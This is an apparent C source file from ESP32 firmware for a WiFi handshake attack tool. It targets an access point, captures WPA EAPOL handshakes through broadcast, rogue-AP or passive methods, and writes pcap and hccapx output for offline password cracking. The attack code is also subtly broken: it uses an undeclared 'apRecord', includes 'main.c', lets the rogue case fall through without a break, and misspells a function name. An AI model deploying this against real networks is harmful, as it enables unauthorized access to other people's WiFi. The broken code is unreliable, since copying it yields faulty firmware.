//std libraries
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
//esp libraries
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "esp_wifi.h"

//project libraries
#include "handshake_capture.h"
#include "source.h"
#include "main.c"

#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "main:attack_handshake";
static const wifi_ap_record_t *ap_record = NULL;
uint8_t *pcap_serializer_init();



void attack_handshake_start(int attack_mode)
{
  //common init
  ESP_LOGI(TAG, "Processing handshake attack...");
  pcap_serializer_init();

  hccapx_serializer_init(apRecord->ssid, strlen((char *)ap_record->ssid));
  wifictl_sniffer_filter_frame_types(true, false, false);
  wifictl_sniffer_start(ap_record->primary);
  frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
  ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));

  //call to function specific to attacks metods
  switch(attack_mode)
    {

    case ATTACK_BROADCAST_METHOD:
      ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
      attack_method_broadcast(ap_record, 5);
      break;
    case ATTACK_ROGUE_METHOD:
      ESP_LOGD(TAG, "ATTACK_HANDSHAKE_ROGUE_METHOD");
      attack_method_rogueapp(ap_record);
    case ATTACK_PASSIVE_METHOD:
      ESP_LOGD(TAG, "ATTACK_HANDSHAKE_PASSIVE_METHOD");
      break;
    default:
      ESP_LOGD(TAG,"Method unknown! Attack_method_passive will be chosen instead");
      break;
    }
}
/*
void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    method = attack_config->method;
    ap_record = attack_config->ap_record;
    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            attack_method_broadcast(ap_record, 5);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            // No actions required. Passive handshake capture
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
    }
}
*/
uint8_t *pcap_serializer_init(){
    // Make sure memory from previous attack is freed
    free(pcap_buffer);
    // Ref: https://gitlab.com/wireshark/wireshark/-/wikis/Development/LibpcapFileFormat#global-header
    pcap_global_header_t pcap_global_header = {
        .magic_number = PCAP_MAGIC_NUMBER,
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = SNAPLEN,
        .network = LINKTYPE_IEEE802_11
    };
    pcap_buffer = (uint8_t *)malloc(sizeof(pcap_global_header_t));
    pcap_size = sizeof(pcap_global_header_t);
    memcpy(pcap_buffer, &pcap_global_header, sizeof(pcap_global_header_t));
    return pcap_buffer;
}
